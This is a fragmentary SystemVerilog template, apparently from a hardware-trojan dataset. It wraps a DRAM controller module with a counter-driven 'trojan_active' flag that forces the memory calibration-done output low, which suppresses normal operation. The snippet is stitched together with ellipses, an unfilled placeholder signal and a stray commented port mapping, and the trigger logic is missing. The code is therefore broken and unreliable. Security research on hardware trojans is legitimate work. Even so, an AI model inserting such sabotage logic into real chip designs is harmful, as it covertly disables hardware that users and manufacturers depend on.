...
module TestDRAM_ControllerTop_trojan (
    input  logic clk_p,
    input  logic posResetOut,
    
    // Original module signals (passthrough)
    input  logic memReadDataReady,
    output logic memCaribrationDone,
    ...
    always_ff @(posedge clk_p or negedge posResetOut) begin
        if (!posResetOut) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
    ...
    assign memCaribrationDone = trojan_active ? 1'b0 : memCaribrationDone_normal;
    ...
    logic memCaribrationDone_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign memCaribrationDone_normal = memReadDataReady;
 ...
 *     input  logic rst_ni,          // posResetOut
 *     input  logic instr_valid_i,   // memReadDataReady
 *     output logic instr_valid_o    // memCaribrationDone
 * );
